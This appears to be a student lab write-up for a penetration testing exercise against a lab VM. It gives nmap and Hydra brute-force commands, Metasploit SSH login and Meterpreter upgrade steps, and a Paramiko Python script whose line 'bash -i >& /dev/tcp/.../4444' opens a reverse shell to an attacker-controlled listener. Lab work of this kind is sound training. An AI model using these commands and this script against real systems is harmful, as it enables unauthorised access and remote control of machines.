# Phase 1: Exploitation and Reverse Shell

## ✅ Task 1.1: Compromise the target using Metasploit

### Service Targeted
- **Service**: SSH (OpenSSH 6.6.1p1)
- **Vulnerable Credentials**: `vagrant:vagrant`

### Steps Followed:
1. **Reconnaissance**:
   ```bash
   nmap -sV -p22 192.168.142.131
   ```
   - Identified OpenSSH running on port 22

2. **Brute-Force with Hydra**:
   ```bash
   hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131 -t 4
   ```
   - Discovered working credentials: `vagrant:vagrant`

3. **Exploit with Metasploit**:
   ```
   sudo msfconsole
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 192.168.142.131
   set USERNAME vagrant
   set PASSWORD vagrant
   run
   ```
   - SSH shell session established

4. **Upgrade to Meterpreter**:
   ```
   use post/multi/manage/shell_to_meterpreter
   set SESSION 1
   session 1 
   shell
   ```
   - Upgraded shell to Meterpreter session


## ✅ Task 1.2: Exploit via Custom Python Script

### Script Summary
- Used Python with Paramiko to automate SSH login and trigger a reverse shell.

### Python Script: `ssh_bruteforce_reverse.py`
```python
import paramiko
import time

host = "192.168.142.131"
port = 22
username = "vagrant"
password = "vagrant"
reverse_shell_cmd = "bash -i >& /dev/tcp/192.168.142.129/4444 0>&1"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(host, port=port, username=username, password=password)

stdin, stdout, stderr = client.exec_command(reverse_shell_cmd)
time.sleep(2)
client.close()
```

### Listener on Attacker Machine
```bash
nc -lvnp 4444
```
- Successful reverse shell received.

---

📸 Screenshots to Include:
- Hydra output showing credentials found
- Metasploit SSH login success
- Meterpreter session after upgrade
- Netcat receiving reverse shell
- Python script execution

